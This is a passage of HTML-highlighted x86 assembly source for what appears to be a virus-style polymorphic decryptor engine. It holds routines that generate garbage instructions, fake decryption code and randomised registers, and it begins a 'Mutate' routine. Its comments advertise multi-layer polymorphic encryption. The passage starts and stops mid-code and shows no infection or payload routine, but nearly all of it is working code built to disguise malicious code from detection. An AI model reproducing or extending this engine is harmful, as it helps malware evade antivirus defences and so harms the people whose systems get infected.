        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">
                                
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate clc/stc/cmc/cld/std</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_save_code</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_save_code</span><span class="sc4">-</span><span class="sc5">tbl_save_code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_save_code</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate code that does not change register contents</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_free</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">loop_free</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_free</span><span class="sc4">-</span><span class="sc5">tbl_free</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_free</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_free</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate fake decrypt instructions</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_fake_crypt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">bad_fake_size</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfDataAreas</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">                
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">bad_fake_size</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_ptr_disp</span><span class="sc4">]</span><span class="sc0">          
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_crypt_key</span><span class="sc4">]</span><span class="sc0">         
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_build_flags</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_index_mask</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_oper_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">          </span><span class="sc1">;Get encryption key</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_crypt_key</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                  
                
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">          </span><span class="sc1">;Get generation flags</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_build_flags</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">          </span><span class="sc1">;Get size of mem operand</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ok_fake_size</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ok_fake_size</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">ok_fake_size</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_oper_size</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">          </span><span class="sc1">;Choose displacement                </span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_fake_disp</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000FFFFFh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">              
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">ok_fake_disp</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_ptr_disp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfDataAreas</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_data_area</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_ptr_disp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                
                    
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_IS_INDEX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_index_mask</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">            
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">                </span><span class="sc1">;Garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fake_or_not</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">                </span><span class="sc1">;Garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_IS_INDEX</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_oper_size</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_index_mask</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_build_flags</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_crypt_key</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_ptr_disp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">bad_fake_size</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get a ramdom reg</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">get_rnd_reg</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000007h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get a ramdom reg (avoid REG_READ_ONLY, REG_IS_COUNTER and REG_IS_INDEX)</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">get_valid_reg</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">REG_IS_INDEX</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">REG_IS_COUNTER</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">REG_READ_ONLY</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Load ecx with crypt_size / oper_size</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">fixed_size2ecx</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeCrypt</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_2ecx</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ok_2ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">ok_2ecx</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate polymorphic decryptor... Whats new on this poly engine?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;- No need to get delta offset</span><span class="sc0">
</span><span class="sc1">;- New garbage generators:</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;   o Fake decrypt instructions</span><span class="sc0">
</span><span class="sc1">;   o Instructions that write/read from/to memory</span><span class="sc0">
</span><span class="sc1">;   o New ways for JMP</span><span class="sc0">
</span><span class="sc1">;   o New ways for POP</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;- The engine can be called several times in order to produce multi-layer</span><span class="sc0">
</span><span class="sc1">;  polymorphic encrytion</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;       esi -&gt; Pointer to code</span><span class="sc0">
</span><span class="sc1">;       edi -&gt; Where to generate polymorphic decryptor</span><span class="sc0">
</span><span class="sc1">;       ecx -&gt; Size of area to encrypt</span><span class="sc0">
</span><span class="sc1">;       edx -&gt; Entry point to code once decrypted</span><span class="sc0">
</span><span class="sc1">;On exit:</span><span class="sc0">
</span><span class="sc1">;       ecx -&gt; Decryptor size</span><span class="sc0">
</span><span class="sc1">;       edi -&gt; End of decryptor</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Mutate</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;Save base address</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PtrToEP</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">;Save ptr to entry-point</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PtrToCrypt</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">  </span><span class="sc1">;Save crypt offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PtrToDecrypt</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeCrypt</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">;Save size of block             </span><span class="sc0">
                                
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_startup</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Init register table</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0">     \
                   </span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc0">    \
                   </span><span class="sc5">REG_FLAGS</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000007h</span><span class="sc0">
</span><span class="sc5">loop_init_regs</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_init_regs</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfDataAreas</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">;Clear # of data area</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">;Clear recursive</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NUM_DA</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_data_area</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Init data areas</span><span class="sc0">
</span><span class="sc5">loop_init_da</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_init_da</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">      </span><span class="sc1">;Choose index register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_IS_INDEX</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;Init call table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">style_table</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">clear_style</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">clear_style</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">      </span><span class="sc1">;Choose counter register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
